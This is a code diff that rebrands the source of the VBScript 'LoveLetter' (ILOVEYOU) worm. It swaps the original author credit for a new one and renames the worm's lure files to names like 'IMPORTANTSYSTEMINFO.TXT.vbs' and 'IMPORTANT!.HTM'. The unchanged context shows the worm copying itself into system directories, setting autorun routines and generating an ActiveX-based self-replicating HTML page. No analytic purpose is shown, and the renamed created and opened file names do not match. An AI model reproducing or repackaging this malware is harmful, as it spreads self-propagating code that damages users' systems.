@@ -1,5 +1,5 @@
 rem  barok -loveletter(vbe) <i hate go to school>
-rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
+rem by: Created By Baconator // BaconsSandbox.rf.gd
 On Error Resume Next
 
 rem Setup global variables to be used throughout subroutines and functions.
@@ -42,7 +42,7 @@ Sub main()
   rem LOVE-LETTER-FOR-YOU.TXT.vbs
   c.Copy(dirsystem & "\MSKernel32.vbs")
   c.Copy(dirwin & "\Win32DLL.vbs")
-  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+  c.Copy(dirsystem & "\IMPORTANTSYSTEMINFO.TXT.vbs")
 
   rem Call the other subroutines.
   regruns()
@@ -346,7 +346,7 @@ Sub html
   rem Generates an HTML page which contains a JScript and VBScript to replicate
   rem itself by leveraging ActiveX. It also listens for mouse and key events,
   rem which will open additional windows of the same page.
-  dta1 = "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
+  dta1 = "<HTML><HEAD><TITLE>IMPORTANT INFO - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
     & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
     & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
     & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
@@ -422,11 +422,11 @@ Sub html
   Next
 
   rem Create the LOVE-LETTER-FOR-YOU.HTM file in the system directory.
-  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
+  Set b = fso.CreateTextFile(dirsystem + "\IMPORTANT!.HTM")
   b.close
 
   rem Creates the HTM file from everything above.
-  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
+  Set d = fso.OpenTextFile(dirsystem + "\IMPORTANT.HTM", 2)
   d.write dt5
   d.write join(lines, vbcrlf)
   d.write vbcrlf
